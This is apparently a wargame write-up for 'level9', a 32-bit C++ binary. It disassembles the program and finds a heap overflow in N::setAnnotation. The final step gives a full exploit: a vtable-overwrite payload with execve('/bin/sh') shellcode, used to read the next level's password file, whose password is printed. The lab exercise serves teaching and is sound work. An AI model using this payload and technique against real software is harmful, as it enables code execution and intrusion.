# 

```asm
080485f4 <main>:
 80485f4:	55                   	push   ebp
 80485f5:	89 e5                	mov    ebp,esp
 80485f7:	53                   	push   ebx
 80485f8:	83 e4 f0             	and    esp,0xfffffff0
 80485fb:	83 ec 20             	sub    esp,0x20
 80485fe:	83 7d 08 01          	cmp    DWORD PTR [ebp+0x8],0x1
 8048602:	7f 0c                	jg     8048610 <main+0x1c>
 8048604:	c7 04 24 01 00 00 00 	mov    DWORD PTR [esp],0x1
 804860b:	e8 e0 fe ff ff       	call   80484f0 <_exit@plt>
```
Exit is called if argc < 2, we need to provide at least 1 argument to keep going

```asm
080486f6 <_ZN1NC1Ei>:
...
0804870e <_ZN1N13setAnnotationEPc>:
...
0804873a <_ZN1NplERS_>:
...
0804874e <_ZN1NmiERS_>:
...
```
We can see 4 functions with C++ mangled names

```shell
~$ c++filt _ZN1NC1Ei
N::N(int)
~$ c++filt _ZN1NmiERS_
N::operator-(N&)
~$ c++filt _ZN1NplERS_
N::operator+(N&)
~$ c++filt _ZN1N13setAnnotationEPc
N::setAnnotation(char*)
```
We demangle them with `c++filt`

```asm
 8048639:	e8 f2 fe ff ff       	call   8048530 <_Znwj@plt>
...
 8048617:	e8 14 ff ff ff       	call   8048530 <_Znwj@plt>
```
We also have some calls to `_Znwj@plt`, which can also be demangled with `c++filt` as `operator new(unsigned int)`, 

```asm
 8048617:	e8 14 ff ff ff       	call   8048530 <_Znwj@plt>
 804861c:	89 c3                	mov    ebx,eax
 804861e:	c7 44 24 04 05 00 00 	mov    DWORD PTR [esp+0x4],0x5
 8048625:	00 
 8048626:	89 1c 24             	mov    DWORD PTR [esp],ebx
 8048629:	e8 c8 00 00 00       	call   80486f6 <_ZN1NC1Ei>
 804862e:	89 5c 24 1c          	mov    DWORD PTR [esp+0x1c],ebx
```
A first class is created with `new`, then the constructor `N::N(int n)` is called with n=5, then is stored at `[esp+0x1c]` for later use

```asm
 8048639:	e8 f2 fe ff ff       	call   8048530 <_Znwj@plt>
 804863e:	89 c3                	mov    ebx,eax
 8048640:	c7 44 24 04 06 00 00 	mov    DWORD PTR [esp+0x4],0x6
 8048647:	00 
 8048648:	89 1c 24             	mov    DWORD PTR [esp],ebx
 804864b:	e8 a6 00 00 00       	call   80486f6 <_ZN1NC1Ei>
 8048650:	89 5c 24 18          	mov    DWORD PTR [esp+0x18],ebx
```
Same for a second class, with n=6, stored at `[esp+0x18]`

```asm
0804870e <_ZN1N13setAnnotationEPc>:
 804870e:	55                   	push   ebp
 804870f:	89 e5                	mov    ebp,esp
 8048711:	83 ec 18             	sub    esp,0x18
 8048714:	8b 45 0c             	mov    eax,DWORD PTR [ebp+0xc]
 8048717:	89 04 24             	mov    DWORD PTR [esp],eax
 804871a:	e8 01 fe ff ff       	call   8048520 <strlen@plt>
 804871f:	8b 55 08             	mov    edx,DWORD PTR [ebp+0x8]
 8048722:	83 c2 04             	add    edx,0x4
 8048725:	89 44 24 08          	mov    DWORD PTR [esp+0x8],eax
 8048729:	8b 45 0c             	mov    eax,DWORD PTR [ebp+0xc]
 804872c:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
 8048730:	89 14 24             	mov    DWORD PTR [esp],edx
 8048733:	e8 d8 fd ff ff       	call   8048510 <memcpy@plt>
 8048738:	c9                   	leave  
 8048739:	c3                   	ret    
```
In the `setAnnotation` function, the argument string is copied to a buffer on the heap with `memcpy`, the size of the copy is determined by `strlen` of the input string. This is a potential buffer overflow if the input string is too long

```
 8048677:	e8 92 00 00 00       	call   804870e <_ZN1N13setAnnotationEPc>
```
The `setAnnotation` function is called at the end of `main`. But then `operator+` is called on the two classes

```asm
 804867c:	8b 44 24 10          	mov    eax,DWORD PTR [esp+0x10]
 8048680:	8b 00                	mov    eax,DWORD PTR [eax]
 8048682:	8b 10                	mov    edx,DWORD PTR [eax]
```
After calling `setAnnotation`, the first class is loaded in `eax`, then the first virtual method entry is loaded in `eax`

```asm
 8048684:	8b 44 24 14          	mov    eax,DWORD PTR [esp+0x14]
 8048688:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
 804868c:	8b 44 24 10          	mov    eax,DWORD PTR [esp+0x10]
 8048690:	89 04 24             	mov    DWORD PTR [esp],eax
 8048693:	ff d2                	call   edx
```
This method is called with the first class as `this` and the second class as an argument, this is the `operator+` function. We can then, during `setAnnotation` calling, overwrite the vtable address and put a shellcode at its first entry.

```shell
(gdb) run $(python -c 'print "A"*108')
Starting program: /home/user/level9/level9 $(python -c 'print "A"*108')
[Inferior 1 (process 2685) exited with code 0107]
(gdb) run $(python -c 'print "A"*109')
Starting program: /home/user/level9/level9 $(python -c 'print "A"*109')

Program received signal SIGSEGV, Segmentation fault.
0x54000000 in ?? ()
```
- We need to put our exploit code after 108 bytes of offset.

```0804870e <_ZN1N13setAnnotationEPc>:
 804870e:	55                   	push   ebp
 804870f:	89 e5                	mov    ebp,esp
 8048711:	83 ec 18             	sub    esp,0x18
 8048714:	8b 45 0c             	mov    eax,DWORD PTR [ebp+0xc]
 8048717:	89 04 24             	mov    DWORD PTR [esp],eax
 804871a:	e8 01 fe ff ff       	call   8048520 <strlen@plt>
 804871f:	8b 55 08             	mov    edx,DWORD PTR [ebp+0x8]
 8048722:	83 c2 04             	add    edx,0x4
```
- We want to find the address of the class buffer, where we'll write our shellcode. The `this` pointer is located at `[ebp+0x8]`, then +4 is to move from the vtable to the buffer, we print the address

```
(gdb) b _ZN1N13setAnnotationEPc
Breakpoint 1 at 0x8048714
(gdb) run aaaa
Starting program: /home/user/level9/level9 aaaa
Breakpoint 1, 0x08048714 in N::setAnnotation(char*) ()
(gdb) ni
(gdb) ni
(gdb) ni
(gdb) ni
(gdb) x $edx
0x804a00c:      0x00000000
```
The address is `0x804a00c`

```
0x804a010 [4 bytes] | [21 bytes] | [83 bytes] | 0x804a00c [4 bytes]
shellcode address   | shellcode  | offset     | new vtable address (buffer address)
```
- What we want to write in the buffer

```shell
~$ ./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 83 + "\x0c\xa0\04\x08"')
$ cat /home/user/bonus0/.pass      
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```